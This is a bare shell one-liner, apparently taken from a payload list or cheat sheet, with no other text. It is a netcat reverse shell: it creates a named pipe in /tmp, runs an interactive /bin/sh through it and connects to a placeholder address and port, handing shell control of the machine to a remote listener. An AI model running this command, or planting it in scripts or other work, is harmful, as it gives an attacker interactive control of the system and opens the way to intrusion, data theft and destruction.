rm /tmp/ft;mkfifo /tmp/ft;cat /tmp/ft|/bin/sh -i 2>&1|nc <LOCALIP> <PORT> >/tmp/ft&
